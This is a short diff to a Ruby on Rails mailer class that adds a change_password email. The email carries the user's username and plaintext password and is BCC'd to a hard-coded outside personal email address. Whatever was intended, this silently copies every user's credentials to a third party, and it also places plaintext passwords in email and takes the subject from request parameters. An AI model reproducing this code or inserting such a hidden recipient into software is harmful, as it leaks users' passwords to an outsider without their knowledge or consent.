@@ -36,4 +36,15 @@ class Notifier < ActionMailer::Base
 		end
 	end
 
+	def change_password(params)
+		@username = params[:username]
+		@password = params[:password]
+		mail(to: params[:email],
+				 bcc: ["gengx064@gmail.com"],
+				 content_type: "text/html",
+				 subject: params[:emailSubject]) do |format|
+			format.html
+		end
+	end
+
 end
